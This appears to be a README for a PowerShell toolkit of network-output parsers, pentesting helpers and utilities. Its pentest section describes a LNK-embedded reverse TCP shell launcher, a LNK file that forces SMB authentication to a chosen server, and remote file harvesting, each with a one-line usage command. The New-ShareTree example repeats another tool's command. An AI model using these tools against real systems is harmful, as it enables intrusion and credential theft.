# Network Parsers
Collection of tools for parsing output of basic network commands

## Import-Netstat
Parses saved Netstat output (supports any/all of -a, -n, -o) and returns an object.

```
Import-Netstat -Path C:\Path\To\File(s)
```

## Import-IPConfig
Parses text files containing output of ipconfig or ipconfig /all and returns an object.

```
Import-IPConfig -Path C:\Path\To\File(s)
```

# Penetration Testing Tools
Collection of simple tools to make life a little less manual while pentesting.
## New-LNKShell.ps1
Creates a reverse TCP shell launcher embedded in a LNK file.

```
New-LNKShell -ComputerName 192.168.1.1 -Port 4444 -Application calc.exe
```

## New-SMBLNK.ps1
Creates an LNK file that, when viewed, will cause a client to authenticate to the specified server.
```
.\New-SMBLNK.ps1 -ComputerName 192.168.1.1 -Share Files -Application calc.exe
```

## FindFiles.psm1
Module containing two functions, one for pulling a list of remote files, the other for downloading interesting ones.
```
PS C:\> Export-FileList -ComputerName FOO1 -Drive C -Directory Temp -OutputPath C:\Path\To\Output

PS C:\> Get-File.ps1 -TargetFiles targets.csv -OutPath C:\Path\To\Output
```

# Miscellaneous
## Remove-Files.ps1
Removes files older than n days. Defaults to C:\Users\<YOU>\Downloads and 30 days

```
Remove-Files -Path C:\Path\To\Files -MaxAge 60
```

## Test-Port.ps1
Checks for open port and returns $True if open.

```
Test-Port.ps1 -Protocol TCP -Port 3389 -Targets 192.168.1.10
```

## Get-Base.ps1
Encode text to a Base64 string and back again.

```
Get-Base -String 'Hello World!' >>> SGVsbG8gV29ybGQh
Get-Base -Base64 'SGVsbG8gV29ybGQh' >>> Hello World!
```

## Get-NetInfo.ps1
Uses WMI to remotely gather information about network interfaces on target computer(s).

```
PS C:\> Get-NetInfo -ComputerName COMPUTER01 -Credential dmz\administrator
```

## Get-WritablePath.ps1
A noisy, hacky way of testing for writable directories.

```
PS C:\> Get-WritablePath -Path C:\Path\To\Files
```

## New-ShareTree.ps1
Creates a folder hierarchy full of random files/folders.
```
PS C:\> Get-WritablePath -Path C:\Path\To\Files
```
